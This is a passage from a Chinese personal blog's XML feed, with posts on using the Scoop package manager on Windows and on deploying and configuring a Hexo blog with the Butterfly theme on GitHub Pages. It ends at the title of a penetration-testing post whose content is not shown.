apps:</span><br><span class="line">Name Version Source Updated             Info</span><br><span class="line">---- ------- ------ -------             ----</span><br><span class="line">7zip 21.07   main   2022-05-03 23:05:15</span><br></pre></td></tr></table></figure><ol start="4"><li>查看应用信息</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scoop status 7zip</span><br><span class="line">scoop info 7zip</span><br><span class="line">Name        : 7zip</span><br><span class="line">Description : A multi-format file archiver with high compression ratios</span><br><span class="line">Version     : 21.07</span><br><span class="line">Bucket      : main</span><br><span class="line">Website     : https://www.7-zip.org</span><br><span class="line">License     : LGPL-2.1-or-later</span><br><span class="line">Updated at  : 2022/4/4 17:24:43</span><br><span class="line">Updated by  : Issac Lin</span><br><span class="line">Installed   : 21.07</span><br><span class="line">Binaries    : 7z.exe</span><br><span class="line">Shortcuts   : 7-Zip</span><br><span class="line">Notes       : Add 7-Zip as a context menu option by running: &quot;&lt;root&gt;\install-context.reg&quot;</span><br></pre></td></tr></table></figure><ol start="5"><li>Scoop更新应用</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 更新scoop</span><br><span class="line">scoop update</span><br><span class="line"># 更新7zip</span><br><span class="line">scoop update 7zip</span><br><span class="line"># 更新全部</span><br><span class="line">scoop *</span><br></pre></td></tr></table></figure><ol start="6"><li>卸载删除应用</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scoop uninstall 7zip</span><br><span class="line">Uninstalling &#x27;7zip&#x27; (21.07).</span><br><span class="line">Removing shim &#x27;7z.shim&#x27;.</span><br><span class="line">Removing shim &#x27;7z.exe&#x27;.</span><br><span class="line">Removing shortcut ~\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Scoop Apps\7-Zip.lnk</span><br><span class="line">Unlinking D:\scoop\apps\7zip\current</span><br><span class="line">&#x27;7zip&#x27; was uninstalled.</span><br></pre></td></tr></table></figure><h1 id="Scoop下载加速"><a href="#Scoop下载加速" class="headerlink" title="Scoop下载加速"></a>Scoop下载加速</h1><ol><li>安装 Aria2 来加速下载</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scoop install aria2</span><br></pre></td></tr></table></figure><ol start="2"><li>如果使用代理，有时需要通过如下命令关闭 aria2</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scoop config aria2-enabled false</span><br></pre></td></tr></table></figure><ol start="3"><li>aria2 在 Scoop 中默认开启</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scoop config aria2-enabled true</span><br></pre></td></tr></table></figure><ol start="4"><li>其他参数</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scoop config aria2-retry-wait 4</span><br><span class="line">scoop config aria2-split 16</span><br><span class="line">scoop config aria2-max-connection-per-server 16</span><br><span class="line">scoop config aria2-min-split-size 4M</span><br></pre></td></tr></table></figure><h1 id="Scoop调用管理员"><a href="#Scoop调用管理员" class="headerlink" title="Scoop调用管理员"></a>Scoop调用管理员</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scoop install sudo </span><br><span class="line">sudo cmd.exe</span><br></pre></td></tr></table></figure><h1 id="Scoop其他bucket"><a href="#Scoop其他bucket" class="headerlink" title="Scoop其他bucket"></a>Scoop其他bucket</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scoop bucket add scoopet https://github.com/ivaquero/scoopet.git</span><br><span class="line">scoop update</span><br></pre></td></tr></table></figure><h1 id="Scoop创建安装程序"><a href="#Scoop创建安装程序" class="headerlink" title="Scoop创建安装程序"></a>Scoop创建安装程序</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scoop create url</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;version&quot;:  &quot;&quot;,  // 版本</span><br><span class="line">    &quot;license&quot;:  &quot;&quot;,</span><br><span class="line">    &quot;extract_dir&quot;:  &quot;&quot;, // 解压目录</span><br><span class="line">    &quot;url&quot;:  &quot;&quot;,  下载url地址</span><br><span class="line">    &quot;homepage&quot;:  &quot;&quot;,  // 官网主页</span><br><span class="line">    &quot;hash&quot;:  &quot;&quot;,  // 安装文件或压缩包sha256 hash值</span><br><span class="line">    &quot;bin&quot;:  &quot;&quot; // 应用程序名</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">scoop install .\app.json</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 包管理器 </tag>
            
            <tag> scoop </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>0x01 - 环境搭建</title>
      <link href="/2022-08-18-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/0x01-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
      <url>/2022-08-18-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/0x01-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>hexo教程-在GitHub部署hexo个人博客</title>
      <link href="/2022-08-17-hexo%E6%95%99%E7%A8%8B/hexo%E6%95%99%E7%A8%8B-%E5%9C%A8GitHub%E9%83%A8%E7%BD%B2hexo%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/"/>
      <url>/2022-08-17-hexo%E6%95%99%E7%A8%8B/hexo%E6%95%99%E7%A8%8B-%E5%9C%A8GitHub%E9%83%A8%E7%BD%B2hexo%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/</url>
      
        <content type="html"><![CDATA[<p>由于比较懒不想操心博客的运维，而且腾讯云的服务器也快到期了，就先将Blog部署在GitHub上吧。</p><h1 id="hexo简介"><a href="#hexo简介" class="headerlink" title="hexo简介"></a>hexo简介</h1><p>hexo是一款快速、简洁且高效的博客框架，支持markdown写作（选择hexo的另一个原因），可以快速的生成静态网页，而且插件丰富。优点还是不少，就不一一赘述。附上官网链接。</p><blockquote><p><a href="https://hexo.io/zh-cn/">https://hexo.io/zh-cn/</a></p></blockquote><h1 id="安装hexo"><a href="#安装hexo" class="headerlink" title="安装hexo"></a>安装hexo</h1><p>安装 Hexo 相当简单，只需要先安装node.js和git（git安装方法自行百度）</p><blockquote><ul><li><a href="http://nodejs.org/">Node.js</a> (Node.js 版本需不低于 10.13，建议使用 Node.js 12.0 及以上版本)</li><li><a href="http://git-scm.com/">Git</a></li><li><a href="https://blog.csdn.net/antma/article/details/86104068">node.js安装参考这位大佬的教程</a></li></ul></blockquote><ol><li>npm安装hexo包</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install -g hexo-cli</span><br></pre></td></tr></table></figure><p>安装完hexo包可用<code>npm hexo-cli -v</code>查看版本，相应的目录下会有变化</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208142002229.png" alt="image-20220814200222125" style="zoom:50%;" /><ol start="2"><li>将 Hexo 所在的目录下的 <code>node_modules</code> 添加到环境变量之中即可直接使用 <code>hexo &lt;command&gt;</code>，执行命令</li></ol><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208141958704.png" alt="image-20220814195830542" style="zoom:50%;" /><ol start="3"><li>开始建站，执行下列命令，Hexo 将会在指定文件夹中新建所需要的文件</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo init .\myblog</span><br><span class="line">cd myblog</span><br><span class="line">npm install</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208142012267.png" alt="image-20220814201251111" style="zoom:50%;" /><blockquote><p>这些目录里面放了什么文件可以参考<a href="https://hexo.io/zh-cn/docs/setup">官方文档</a></p></blockquote><h1 id="使用hexo创作"><a href="#使用hexo创作" class="headerlink" title="使用hexo创作"></a>使用hexo创作</h1><ol><li>新建FirstBlog，执行下面命令后，会自动在<code>myblog\source\\_posts</code>目录下创建名为<code>firtblog.md</code>的文件</li></ol><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo new <span class="string">&quot;FirstBlog&quot;</span></span><br><span class="line">或者简写为</span><br><span class="line">hexo n <span class="string">&quot;FirstBlog&quot;</span></span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208142028651.png" alt="image-20220814202817526" style="zoom:50%;" /><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208142030299.png" alt="image-20220814203052183" style="zoom:50%;" /><ol start="2"><li>hexo渲染markdown文件，生成html等静态页面：</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo generate</span><br><span class="line">或者</span><br><span class="line">hexo g</span><br></pre></td></tr></table></figure><p>生成的文件都在<code>myblog\public</code>目录下</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208142036923.png" alt="image-20220814203631732" style="zoom:50%;" /><ol start="3"><li>本地启动服务测试一下：</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo server</span><br><span class="line">或者</span><br><span class="line">hexo s</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208142038525.png" alt="image-20220814203848381" style="zoom:50%;" /><blockquote><p>这个服务开启的端口可以myblog\node_modules&#x2F;hexo-server&#x2F;index.js 文件中修改(因为有时候存在端口占用的情况)</p></blockquote><p>这个时候可以看到，成功了，但是略丑~，不急，后面可以换主题美化-</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208142044320.png" alt="image-20220814204418980" style="zoom:50%;" /><h1 id="GitHub部署Blog"><a href="#GitHub部署Blog" class="headerlink" title="GitHub部署Blog"></a>GitHub部署Blog</h1><ol><li>先在GitHub上创立一个仓库，单击new~，：</li></ol><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208142017620.png" alt="image-20220814201720473" style="zoom:50%;" /><ol start="2"><li>Repository name设为<code>Yourname.github.io</code>，其他默认即可</li></ol><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208142021969.png" alt="image-20220814202142829" style="zoom:50%;" /><p>可以在setting中查看是否成功，若成功会显示url：</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208142213278.png" alt="image-20220814221305122" style="zoom: 33%;" /><ol start="3"><li>打开<code>myblog\\_config.yml</code>这个文件，可以自行配置，参数太多不一一讲解。需要注意的是deploy选项</li></ol><blockquote><p>同理参考官方文档：<a href="https://hexo.io/zh-cn/docs/configuration">https://hexo.io/zh-cn/docs/configuration</a></p></blockquote><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208142048690.png" alt="image-20220814204826516" style="zoom:50%;" /><p>找到deploy选项：</p><blockquote><ul><li><p>同理可以参考官方文档：<a href="https://hexo.io/docs/one-command-deployment">https://hexo.io/docs/one-command-deployment</a></p></li><li><p><strong>注意yaml文件中的缩进</strong>：YAML依靠缩进来确定元素间的从属关系。因此，请确保每个deployer的缩进长度相同，并且使用空格缩进。</p></li></ul></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repo: https://bitbucket.org/John/john.bitbucket.io  #修改为自己GitHub仓库的url</span><br><span class="line">  branch: main#主分支，因人而异</span><br></pre></td></tr></table></figure><ol start="4"><li>git安装部署插件 <a href="https://github.com/hexojs/hexo-deployer-git">hexo-deployer-git</a></li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure><ol start="5"><li>重新生成站点文件并推送至远程库</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo clean &amp;&amp; hexo generate </span><br><span class="line">hexo deploy</span><br><span class="line">解释：</span><br><span class="line">hexo clean   #清除缓存文件 db.json 和已生成的静态文件 public</span><br><span class="line">hexo generate  #渲染 生成静态文件</span><br><span class="line">hexo deploy       #自动生成网站静态文件，并部署到设定的仓库(hexo deploy 的缩写)</span><br></pre></td></tr></table></figure><ol start="6"><li>打开浏览器，输入自己的url：<a href="https://11pmsleep.github.io/">https://11pmsleep.github.io/</a> 就可以看到是否成功：</li></ol><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208142207744.png" alt="image-20220814220707328" style="zoom: 33%;" /><h1 id="换个好看的主题"><a href="#换个好看的主题" class="headerlink" title="换个好看的主题~"></a>换个好看的主题~</h1><blockquote><p>换主题同样是参考文档：<a href="https://hexo.io/zh-cn/docs/themes">https://hexo.io/zh-cn/docs/themes</a></p><p>总而言之~文档里什么都有</p></blockquote><p>我选用的是<a href="https://butterfly.js.org/posts/21cfbf15/">butterfly</a>，因为这个名字很喜欢</p><h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><ol><li>在myblog目录下git拉取主题文件即可</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone -b master https://github.com/jerryc127/hexo-theme-butterfly.git themes/butterfly</span><br><span class="line">如果需更新，主题目录下 git pull即可</span><br><span class="line">在myblog\themes目录下可以看到新增主题butterfly</span><br></pre></td></tr></table></figure><ol start="2"><li>应用主题</li></ol><p>在myblog的目录下 _config.yml，把主题改为主题目录的名字butterfly</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208151501667.png" alt="image-20220815150108479" style="zoom:50%;" /><ol start="3"><li>该主题需要我们额外安装插件</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">如果你没有 pug 以及 stylus 的渲染器，请下载安装：</span><br><span class="line">npm install hexo-renderer-pug hexo-renderer-stylus --save</span><br></pre></td></tr></table></figure><ol start="4"><li>最后重新加载和推送一下就可以看到成果了~~</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo generate </span><br><span class="line">hexo deploy</span><br><span class="line"></span><br><span class="line">或者直接hexo generate --deploy也是一样的。 Hexo 在生成完毕后自动部署网站</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208151518872.png" alt="image-20220815151820608" style="zoom: 33%;" /><p>更详细的配置参考butterfly官方文档吧~</p><h2 id="其他主题推荐"><a href="#其他主题推荐" class="headerlink" title="其他主题推荐"></a>其他主题推荐</h2><blockquote><p>4<a href="https://blinkfox.github.io/">https://blinkfox.github.io/</a></p><p>4<a href="https://butterfly.js.org/">https://butterfly.js.org/</a></p><p>4<a href="https://github.com/fluid-dev/hexo-theme-fluid">https://github.com/fluid-dev/hexo-theme-fluid</a></p><p>3.5<a href="https://dogzi.fun/">https://dogzi.fun/</a></p><p>3.5<a href="https://github.com/shen-yu/hexo-theme-ayer">https://github.com/shen-yu/hexo-theme-ayer</a></p><p>3<a href="https://zhwangart.com/">https://zhwangart.com/</a></p><p>3<a href="https://liuyib.github.io/">https://liuyib.github.io/</a>支持多关键词搜索</p><p>3<a href="https://yuang01.github.io/">https://yuang01.github.io/</a>有弹幕</p><p>2.5<a href="https://molunerfinn.com/">https://molunerfinn.com/</a><a href="https://github.com/Molunerfinn/hexo-theme-melody">https://github.com/Molunerfinn/hexo-theme-melody</a></p><p>2.5<a href="http://fech.in/">http://fech.in/</a><a href="https://github.com/Fechin/hexo-theme-diaspora">https://github.com/Fechin/hexo-theme-diaspora</a></p><p>2<a href="https://github.com/iissnan/hexo-theme-next">https://github.com/iissnan/hexo-theme-next</a></p><p>1.5<a href="https://haojen.github.io/Claudia-theme-blog/">https://haojen.github.io/Claudia-theme-blog/</a></p><p>1<a href="https://volantis.js.org/examples/">https://volantis.js.org/examples/</a><a href="https://github.com/volantis-x/hexo-theme-volantis">https://github.com/volantis-x/hexo-theme-volantis</a></p><p>1<a href="https://github.com/Chorer/hexo-theme-PureBlue">https://github.com/Chorer/hexo-theme-PureBlue</a></p><p>1<a href="https://shuoit.net/">https://shuoit.net/</a></p><p>0.5<a href="https://www.91h5.cc/categories/%E5%B7%A5%E5%85%B7/">https://www.91h5.cc/categories/%E5%B7%A5%E5%85%B7/</a></p><p>0.5<a href="https://mser.xyz/">https://mser.xyz/</a></p><p><a href="http://ghaseminya.ir/">http://ghaseminya.ir/</a></p></blockquote><h1 id="refer："><a href="#refer：" class="headerlink" title="refer："></a>refer：</h1><blockquote><ul><li><p><a href="https://hexo.io/docs/troubleshooting.html#Git-Deployment-Problems">故障排错参考官方文档</a></p></li><li><p><a href="https://butterfly.js.org/posts/dc584b87/">butterfly安装文档</a></p></li><li><p><a href="https://cloud.tencent.com/developer/article/2024117">hexo-butterfly-搜索系统引入</a></p></li><li><p><a href="https://www.cnblogs.com/yyyzyyyz/p/15542401.html">hexo-butterfly魔改记录</a></p></li><li><p><a href="https://www.jianshu.com/p/0b1fccce74e0">利用Hexo在多台电脑上提交和更新github pages博客</a></p></li><li><p>巨好用：<a href="https://blog.eson.org/pub/e2f6e239/#:~:text=hexo-auto-category%20%E6%A0%B9%E6%8D%AE%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%20%28Markdown%29%E6%89%80%E5%9C%A8%E6%96%87%E4%BB%B6%E7%9B%AE%E5%BD%95%E8%87%AA%E5%8A%A8%E5%88%86%E7%B1%BB%EF%BC%8C%E5%8D%B3%E8%87%AA%E5%8A%A8%E7%94%9F%E6%88%90,markdown%20%E7%9A%84front-matter%E4%B8%AD%E7%9A%84%20categories%20%E5%8F%98%E9%87%8F%E3%80%82">【Hexo插件系列】日志的自动分类插件 hexo-auto-category</a></p></li></ul></blockquote>]]></content>
      
      
      <categories>
          
          <category> hexo教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 部署 </tag>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexo教程-写作markdown内的配置</title>
      <link href="/2022-08-17-hexo%E6%95%99%E7%A8%8B/hexo%E6%95%99%E7%A8%8B-%E5%86%99%E4%BD%9Cmarkdown%E5%86%85%E7%9A%84%E9%85%8D%E7%BD%AE/"/>
      <url>/2022-08-17-hexo%E6%95%99%E7%A8%8B/hexo%E6%95%99%E7%A8%8B-%E5%86%99%E4%BD%9Cmarkdown%E5%86%85%E7%9A%84%E9%85%8D%E7%BD%AE/</url>
      
        <content type="html"><![CDATA[<ul><li><p>Front-matter</p><blockquote><p>Front-matter 是 markdown 文件最上方以 — 分隔的区域，用于指定个别档案的变数。</p><blockquote><p>Page Front-matter 用于页面配置</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">title【必需】页面标题</span><br><span class="line">date【必需】页面创建日期</span><br><span class="line">type【必需】标籤、分类和友情链接三个页面需要配置</span><br><span class="line">updated【可选】页面更新日期</span><br><span class="line">description【可选】页面描述</span><br><span class="line">keywords【可选】页面关键字</span><br><span class="line">comments【可选】显示页面评论模块(默认 true)</span><br><span class="line">top_img【可选】页面顶部图片</span><br><span class="line">mathjax【可选】显示mathjax(当设置mathjax的per_page: false时，才需要配置，默认 false)</span><br><span class="line">katex【可选】显示katex(当设置katex的per_page: false时，才需要配置，默认 false)</span><br><span class="line">aside【可选】显示侧边栏 (默认 true)</span><br><span class="line">aplayer【可选】在需要的页面加载aplayer的js和css,请参考文章下面的音乐 配置</span><br><span class="line">highlight_shrink【可选】配置代码框是否展开(true/false)(默认为设置中highlight_shrink的配置)</span><br></pre></td></tr></table></figure><p>Post Front-matter 用于文章页配置</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">title【必需】文章标题</span><br><span class="line">date【必需】文章创建日期</span><br><span class="line">updated【可选】文章更新日期</span><br><span class="line">tags【可选】文章标籤</span><br><span class="line">categories【可选】文章分类</span><br><span class="line">keywords【可选】文章关键字</span><br><span class="line">description【可选】文章描述</span><br><span class="line">top_img【可选】文章顶部图片</span><br><span class="line">cover【可选】文章缩略图(如果没有设置top_img,文章页顶部将显示缩略图，可设为false/图片地址/留空)</span><br><span class="line">comments【可选】显示文章评论模块(默认 true)</span><br><span class="line">toc【可选】显示文章TOC(默认为设置中toc的enable配置)</span><br><span class="line">toc_number【可选】显示toc_number(默认为设置中toc的number配置)</span><br><span class="line">toc_style_simple【可选】显示 toc 简洁模式</span><br><span class="line">copyright【可选】显示文章版权模块(默认为设置中post_copyright的enable配置)</span><br><span class="line">mathjax【可选】显示mathjax(当设置mathjax的per_page: false时，才需要配置，默认 false)</span><br><span class="line">katex【可选】显示katex(当设置katex的per_page: false时，才需要配置，默认 false)</span><br><span class="line">aplayer【可选】在需要的页面加载aplayer的js和css,请参考文章下面的音乐 配置</span><br><span class="line">highlight_shrink【可选】配置代码框是否展开(true/false)(默认为设置中highlight_shrink的配置)</span><br><span class="line">aside【可选】显示侧边栏 (默认 true)</span><br><span class="line">top:置顶</span><br><span class="line">sticky: 1你可以直接在文章的front-matter区域里添加属性来把这篇文章置顶。数值越大，置顶的优先级越大。</span><br><span class="line">toc_max_depth:最大几级目录</span><br><span class="line">link:标题的链接</span><br><span class="line">photos:</span><br></pre></td></tr></table></figure></blockquote></blockquote></li><li><p>文章页 的 top_img ，请到对应的 md 页面，设置front-matter中的top_img</p></li></ul><p>属性值：</p><blockquote><ul><li><p>留空</p></li><li><p>true - 可选择颜色：</p><blockquote><ul><li><p>HEX值 - #0000FF</p></li><li><p>RGB值 - rgb(0,0,255)</p></li><li><p>顔色单词 - orange</p></li><li><p>渐变色 - linear-gradient( 135deg, #E2B0FF 10%, #9F44D3 100%)</p><p>​  linear-gradient(20deg, #0062be, #925696, #cc426e, #fb0347)</p></li></ul></blockquote></li><li><p>false - 显示默认的顔色</p></li><li><p>transparent - 透明</p></li><li><p>img链接：相对或者绝对路径</p></li></ul></blockquote><ul><li><p>文章封面:文章的markdown文档上,在Front-matter添加cover,并填上要显示的图片地址。如果不配置cover,可以设置显示默认的cover.(已经设置了很多张随机了~~)</p></li><li><p>如果有文章（例如：转载文章）不需要显示版权，可以在文章Front-matter单独设置<code>copyright: false</code></p></li><li><p>在文章页，会有一个目录，用于显示TOC。可以为特定的文章配置，在你的文章md文件的头部，加入toc_number和toc，并配置true或者false即可。主题会优先判断文章Markdown的Front-matter是否有配置，如有，则以Front-matter的配置为准。否则，以主题配置文件中的配置为准</p></li><li><p>如果你需要展示的内容太多，可以把它隐藏在收缩框里，需要时再把它展开。( display 不能包含英文逗号，可用&amp;sbquo;)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% hideToggle display,bg,color %&#125;</span><br><span class="line">content</span><br><span class="line">&#123;% endhideToggle %&#125;</span><br><span class="line"></span><br><span class="line">比如：</span><br><span class="line">&#123;% hideToggle Butterfly安装方法 %&#125;</span><br><span class="line">在你的博客根目录里</span><br><span class="line">git clone -b master https://github.com/jerryc127/hexo-theme-butterfly.git themes/Butterfly</span><br><span class="line">如果想要安装比较新的dev分支，可以</span><br><span class="line">git clone -b dev https://github.com/jerryc127/hexo-theme-butterfly.git themes/Butterfly</span><br><span class="line">&#123;% endhideToggle %&#125;</span><br></pre></td></tr></table></figure></li><li><p>Tabs使用方法</p></li></ul><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">&#123;% tabs Unique name, [index] %&#125;</span><br><span class="line">&lt;!-- tab [Tab caption] [@icon] --&gt;</span><br><span class="line">Any content (support inline tags too).</span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line">&#123;% endtabs %&#125;</span><br><span class="line"></span><br><span class="line">Unique name   : Unique name of tabs block tag without comma.</span><br><span class="line"><span class="code">                Will be used in #id&#x27;s as prefix for each tab with their index numbers.</span></span><br><span class="line"><span class="code">                If there are whitespaces in name, for generate #id all whitespaces will replaced by dashes.</span></span><br><span class="line"><span class="code">                Only for current url of post/page must be unique!</span></span><br><span class="line"><span class="code">[index]       : Index number of active tab.</span></span><br><span class="line"><span class="code">                If not specified, first tab (1) will be selected.</span></span><br><span class="line"><span class="code">                If index is -1, no tab will be selected. It&#x27;s will be something like spoiler.</span></span><br><span class="line"><span class="code">                Optional parameter.</span></span><br><span class="line"><span class="code">[Tab caption] : Caption of current tab.</span></span><br><span class="line"><span class="code">                If not caption specified, unique name with tab index suffix will be used as caption of tab.</span></span><br><span class="line"><span class="code">                If not caption specified, but specified icon, caption will empty.</span></span><br><span class="line"><span class="code">                Optional parameter.</span></span><br><span class="line"><span class="code">[@icon]       : FontAwesome icon name (full-name, look like &#x27;fas fa-font&#x27;)</span></span><br><span class="line"><span class="code">                Can be specified with or without space; e.g. &#x27;Tab caption @icon&#x27; similar to &#x27;Tab caption@icon&#x27;.</span></span><br><span class="line"><span class="code">                Optional parameter.</span></span><br></pre></td></tr></table></figure><p>Demo 1 - 预设选择第一个【默认】</p><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">&#123;% tabs test1 %&#125;</span><br><span class="line">&lt;!-- tab --&gt;</span><br><span class="line"><span class="strong">**This is Tab 1.**</span></span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- tab --&gt;</span><br><span class="line"><span class="strong">**This is Tab 2.**</span></span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- tab --&gt;</span><br><span class="line"><span class="strong">**This is Tab 3.**</span></span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line">&#123;% endtabs %&#125;</span><br></pre></td></tr></table></figure><div class="tabs" id="test1"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#test1-1">test1 1</button></li><li class="tab"><button type="button" data-href="#test1-2">test1 2</button></li><li class="tab"><button type="button" data-href="#test1-3">test1 3</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="test1-1"><p><strong>This is Tab 1.</strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test1-2"><p><strong>This is Tab 2.</strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test1-3"><p><strong>This is Tab 3.</strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><ul><li>评论数据管理</li></ul><p>由于Valine 是无后端评论系统，所以也就没有开发评论数据管理功能。请自行登录<code>Leancloud应用</code>管理。</p><p>具体步骤：<code>登录</code>&gt;<code>选择你创建的应用</code>&gt;<code>存储</code>&gt;选择Class <code>Comment</code>，然后就可以尽情的发挥你的权利啦(～￣▽￣)～</p><blockquote><p>当然，你也可以配合 <a href="https://github.com/DesertsP">@DesertsP</a> 开发的 <a href="https://github.com/DesertsP/Valine-Admin">Valine-Admin</a> 进行<code>评论数据管理</code></p></blockquote><p>注意事项</p><p>在 Hexo 博客中，评论的功能在所有页面都默认开启，但是有的时候我们在页面上不需要显示评论功能，例如分类，标记页面我们并不需要评论功能。</p><p>在 <code>Front-matter</code> 中通过<code>comments</code>属性设置<code>true</code>或<code>false</code>控制该页面或者是文章的评论功能是否打开，如下：</p><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">title: Tags</span><br><span class="line">date: 2019-12-19 16:10:19</span><br><span class="line">type: &quot;tags&quot;</span><br><span class="line">comments: false</span><br></pre></td></tr></table></figure><ul><li>hexo设置永久文内链接，自定义跳转到本站的其他博客：</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% post_link 文章文件名(不要后缀) 显示文字(可自定义，一般写文章标题) %&#125;</span><br></pre></td></tr></table></figure><p>refer:</p><blockquote><ul><li><a href="https://butterfly.js.org/posts/4aa8abbe/#timeline">Butterfly 安装文档(三) 主题配置-1</a></li><li><a href="https://www.jianshu.com/p/b9e73c881729">Hexo 集成 Valine 评论系统</a></li></ul></blockquote>]]></content>
      
      
      <categories>
          
          <category> hexo教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo配置 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>0x25 - Windows密码凭证获取</title>
      <link href="/2022-08-17-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%86%85%E7%BD%91/0x25-Windows%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/"/>
      <url>/2022-08-17-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%86%85%E7%BD%91/0x25-Windows%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/</url>
      
